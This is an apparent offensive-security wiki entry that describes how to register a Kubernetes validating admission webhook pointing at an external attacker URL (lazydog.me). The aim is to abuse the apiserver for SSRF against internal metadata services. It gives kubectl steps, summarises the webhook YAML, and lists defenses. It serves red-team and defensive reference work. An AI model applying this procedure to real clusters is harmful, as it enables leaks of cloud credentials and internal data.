---
id: proc-k8s-malicious-webhook-001
tags:
  - webhook
  - ssrf
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Command and Control]]'
commands:
  - '[[commands/create-malicious-webhook]]'
verified: false
platforms:
  - Kubernetes
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:55.704Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Command and Control]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Malicious-Admission-Webhook

## Summary

Deploy a ValidatingWebhookConfiguration with an arbitrary external URL to enable SSRF when processing service account creations.

## Description

Admission webhooks lack URL validation, allowing pointers to attacker servers. When triggered, apiserver sends requests that can be redirected to internal metadata services, leaking data via logs.

## Requirements

1. Cluster-admin RBAC for admissionregistration.k8s.io
2. YAML file (poc1.yaml) with webhook spec
3. External URL accessible (e.g., https://lazydog.me/aa)

## Defense

- Validate webhook URLs against allowlists
- Use failurePolicy=Ignore for untrusted webhooks
- Audit webhook creations and monitor for external domains

## Objectives

1. Register webhook for serviceaccounts operations
2. Ensure it triggers on CREATE
3. Set up for redirect-based SSRF

## Instructions

### Step 1: Apply Webhook YAML

**Context**: Create the configuration pointing to external endpoint.

**Command** ([[commands/create-malicious-webhook]]):
```bash
kubectl create -f poc1.yaml
```

> YAML includes apiVersion: admissionregistration.k8s.io/v1, kind: ValidatingWebhookConfiguration, with rules for serviceaccounts CREATE/UPDATE/DELETE, clientConfig.url: https://lazydog.me/aa. Expected: Resource created.

### Step 2: Verify Webhook

**Context**: Confirm deployment.

**Command** ([[commands/verify-webhook]]):
```bash
kubectl get validatingwebhookconfigurations
```

> Output lists the webhook.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control]] Command and Control

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/create-malicious-webhook]]
- [[commands/verify-webhook]]

## Tools Used

- [[tools/kubectl]]

## Tags

- webhook
- admission
- ssrf
